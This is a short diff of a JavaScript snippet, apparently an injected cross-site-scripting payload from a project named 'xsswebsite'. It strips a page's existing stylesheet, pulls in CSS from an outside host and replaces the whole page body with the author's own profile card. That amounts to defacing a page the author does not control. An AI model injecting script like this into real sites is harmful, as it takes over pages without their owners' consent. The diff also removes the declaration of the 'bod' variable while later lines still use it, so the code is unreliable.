@@ -5,20 +5,17 @@ var prof = "<aside class=profile-card><header><a target=_blank href=http://paral
 
 // Add CSS to the head
 {
+	var lin = document.getElementsByTagName('link')[0];
+	lin.parentElement.removeChild(lin);
+	
 	var head  = document.getElementsByTagName('head')[0];
     var link  = document.createElement('link');
     link.id   = "injcss";
     link.rel  = 'stylesheet';
     link.type = 'text/css';
-    link.href = 'https://gist.githubusercontent.com/paralin/a85f6ba1834979ade4b7/raw/31eb313747dc10a40f1827631a29cd6e19cc61fb/styles.css';
+    link.href = '//paralin.github.io/xsswebsite/styles.css';
     link.media = 'all';
     head.appendChild(link);
-	
-	// Reset the stupid styles
-	var bod = document.getElementsByTagName('body')[0];
-	bod.style.margin = "0";
-	bod.style.padding = "0";
-	bod.style.background = "";
 	
 	// Set the content of the page
 	bod.innerHTML = "<canvas id=c style=\"position:fixed;top:0;margin:0 auto;left:0;right:0;z-index:-3;\"></canvas>"+prof;
